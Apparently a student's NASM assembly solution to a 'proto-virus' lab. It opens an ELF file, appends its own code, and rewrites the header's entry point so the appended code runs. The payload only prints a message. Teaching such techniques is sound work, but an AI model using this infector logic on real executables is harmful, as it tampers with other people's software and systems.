%macro	syscall1 2
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro	syscall3 4
	mov	edx, %4
	mov	ecx, %3
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro  exit 1
	syscall1 1, %1
%endmacro

%macro  write 3
	syscall3 4, %1, %2, %3
%endmacro

%macro  read 3
	syscall3 3, %1, %2, %3
%endmacro

%macro  open 3
	syscall3 5, %1, %2, %3
%endmacro

%macro  lseek 3
	syscall3 19, %1, %2, %3
%endmacro

%macro  close 1
	syscall1 6, %1
%endmacro

%define	STK_RES	200
%define	RDWR	2
%define	SEEK_END 2
%define SEEK_SET 0

%define ENTRY		24
%define PHDR_start	28
%define	PHDR_size	32
%define PHDR_memsize	20	
%define PHDR_filesize	16
%define	PHDR_offset	4
%define	PHDR_vaddr	8
%define entry_ptr 0x8048080
	
	global _start
	section .data

		entry_off: dd 0
		phdr_off: dd 0
	section .text
_start:	push	ebp
	mov	ebp, esp
	sub	esp, STK_RES            ; Set up ebp and reserve space on the stack for local storage


; You code for this lab goes here
main:
	mov eax,[ebp+12]

	open eax,RDWR,777
	mov [ebp-8],eax
	;jmp infection
	
virus:
	write 1,OutStr,31	;print OutStr
	;jmp VirusExit


	
infection:

	writeVir: lseek [ebp-8], 0, SEEK_END
		mov [ebp - 16], eax
		mov eax,virus_end
		mov ecx,_start
		sub eax,ecx
		write [ebp-8],ecx,eax
	updateEntry: lseek [ebp-8],0,SEEK_SET
		mov eax,ebp
		sub eax,16
		sub eax,PHDR_size
		read [ebp-8], eax, PHDR_size
		mov eax,entry_ptr
		add eax, [ebp-16]
		mov [ebp - PHDR_size - 16 + ENTRY], eax
		lseek [ebp-8], 0, SEEK_SET
		mov ecx,ebp
		sub ecx,PHDR_size+16
		write [ebp-8], ecx, 32
		close [ebp-8]
		jmp VirusExit
            ; Termination if all is OK and no previous code to jump to
                         ; (also an example for use of above macros)
	
FileName:	db "ELFexec", 0
OutStr:		db "The lab 9 proto-virus strikes!", 10, 0
Failstr:        db "perhaps not", 10 , 0
	
PreviousEntryPoint: dd VirusExit
VirusExit:
       exit 0
virus_end:


